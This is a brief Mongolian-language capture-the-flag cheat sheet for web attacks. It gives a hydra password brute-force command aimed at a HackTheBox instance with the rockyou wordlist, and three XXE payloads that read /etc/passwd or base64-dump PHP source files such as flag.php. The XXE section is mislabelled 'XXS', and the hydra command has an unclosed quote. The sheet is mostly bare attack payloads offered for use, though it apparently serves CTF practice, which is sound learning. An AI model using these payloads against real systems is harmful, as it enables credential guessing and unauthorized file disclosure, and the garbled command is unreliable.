Web
--------------------

* `hydra` 

	Командын мөрний түүл бөгөөд brute-force хийх зэрэгт ашиглана.
	`hydra -l admin -P $(locate rockyou.txt) http://docker.hackthebox.eu:33652 http-post-form "/:password=^PASS^:Invalid password -s 53593
	
* `XXS`
	
	* `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>`
	* `<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>`
	* `<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=flag.php"> ]>`
